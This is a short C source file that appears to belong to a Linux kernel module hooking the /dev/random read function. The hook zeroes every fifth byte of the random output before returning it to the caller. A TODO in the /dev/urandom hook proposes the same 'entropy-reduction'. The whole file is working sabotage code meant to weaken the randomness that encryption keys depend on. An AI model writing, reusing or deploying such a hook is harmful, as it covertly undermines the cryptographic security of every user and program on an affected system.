#include "random.h"

asmlinkage ssize_t (*random_read_orig)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
asmlinkage ssize_t (*urandom_read_orig)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

asmlinkage ssize_t random_read_hook(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos) {
    ssize_t i, n;
    char *kbuf;

    if ((n = random_read_orig(file, buf, nbytes, ppos)) <= 0)
        return n;

    if (n > PAGE_SIZE) {
        printk(KERN_WARNING "n > PAGE_SIZE");
        return n;
    }

    if ((kbuf = kmalloc(n, GFP_KERNEL)) == NULL) {
        printk(KERN_WARNING "kmalloc failed");
        return n;
    }

    if (copy_from_user(kbuf, buf, n) > 0) {
        printk(KERN_WARNING "copy_from_user failed");
        kfree(kbuf);
        return n;
    }

    for (i = 0; i < n; i += 5)
        kbuf[i] = 0;

    if (copy_to_user(buf, kbuf, n) > 0)
        printk(KERN_WARNING "copy_to_user failed");

    kfree(kbuf);
    return n;
}

asmlinkage ssize_t urandom_read_hook(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos) {
    ssize_t n;

    n = urandom_read_orig(file, buf, nbytes, ppos);

    // TODO Similar corruption / entropy-reduction can be added here

    return n;
}
